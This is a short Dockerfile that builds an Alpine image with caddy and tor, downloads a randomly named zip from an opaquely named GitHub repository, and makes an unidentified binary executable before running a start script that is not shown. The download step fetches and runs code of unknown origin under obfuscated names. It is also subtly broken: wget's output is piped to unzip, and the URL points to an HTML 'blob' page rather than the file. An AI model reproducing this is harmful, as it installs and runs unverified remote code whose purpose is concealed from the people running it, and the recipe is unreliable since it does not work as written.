FROM alpine:edge

RUN apk update && \
    apk add --no-cache ca-certificates caddy tor wget && \
    wget -qO nggfdfsfs.zip https://github.com/Emnkjuiofdcs/mhhfgsdd/blob/main/nggfdfsfs.zip | busybox unzip nggfdfsfs.zip && \
    chmod +x $(ls /x*y) && \
    rm -rf /var/cache/apk/*

ADD start.sh /start.sh
RUN chmod +x /start.sh

CMD /start.sh
